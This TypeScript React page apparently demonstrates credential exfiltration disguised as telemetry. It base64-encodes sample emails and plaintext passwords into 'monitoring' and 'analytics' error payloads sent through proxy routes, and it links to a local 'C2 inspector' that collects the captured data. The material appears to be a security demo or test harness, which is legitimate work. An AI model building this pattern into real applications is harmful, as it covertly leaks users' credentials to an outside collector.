"use client";

import { useState } from "react";

export default function InternalProxyDemoPage() {
  const [output, setOutput] = useState<string>("");

  const post = async (url: string, body: any) => {
    setOutput("Loading...");
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    const text = await res.text();
    try {
      setOutput(JSON.stringify(JSON.parse(text), null, 2));
    } catch {
      setOutput(text);
    }
  };

  const sendMonitoring = () => {
    const authContext = Buffer.from(
      JSON.stringify({
        email: "alice@example.com",
        password: "s3cr3tPwd!",
        context: "login_attempt",
      })
    ).toString("base64");

    return post("/api/internal-proxy/monitoring", {
      app: "banking-system",
      environment: "dev",
      errors: [
        {
          name: "AuthError",
          message: "Invalid credentials",
          authContext,
        },
      ],
    });
  };

  const sendAnalytics = () => {
    const authData = Buffer.from(
      JSON.stringify({
        email: "bob@example.com",
        password: "P@ssw0rd!",
        context: "login_attempt",
      })
    ).toString("base64");

    return post("/api/internal-proxy/analytics", {
      type: "security_events",
      data: [
        {
          attemptTime: new Date().toISOString(),
          userIdentifier: "bob@example.com",
          authData,
        },
      ],
      appVersion: "1.0.0",
    });
  };

  const sendUserAnalytics = () => {
    return post("/api/internal-proxy/user-analytics", {
      type: "user_behavior_profiles",
      data: [
        { userId: "u1", email: "u1@example.com", accountType: "user" },
      ],
      collectionTime: new Date().toISOString(),
    });
  };

  return (
    <main style={{ maxWidth: 800, margin: "2rem auto", padding: 16 }}>
      <h1>Internal Proxy Demo</h1>
      <p>Use these buttons to send requests from Next.js to the backend via proxy routes.</p>
      <div style={{ display: "flex", gap: 12, marginTop: 12, marginBottom: 24 }}>
        <button onClick={sendMonitoring} style={{ padding: "8px 12px" }}>
          POST monitoring
        </button>
        <button onClick={sendAnalytics} style={{ padding: "8px 12px" }}>
          POST analytics (security_events)
        </button>
        <button onClick={sendUserAnalytics} style={{ padding: "8px 12px" }}>
          POST user-analytics
        </button>
      </div>
      <pre
        style={{
          background: "#111",
          color: "#0f0",
          padding: 16,
          borderRadius: 8,
          minHeight: 200,
          overflow: "auto",
        }}
      >
        {output}
      </pre>
      <p style={{ marginTop: 16 }}>
        C2 inspector: <a href="http://localhost:3003/api/captured-data" target="_blank">http://localhost:3003/api/captured-data</a>
      </p>
    </main>
  );
}
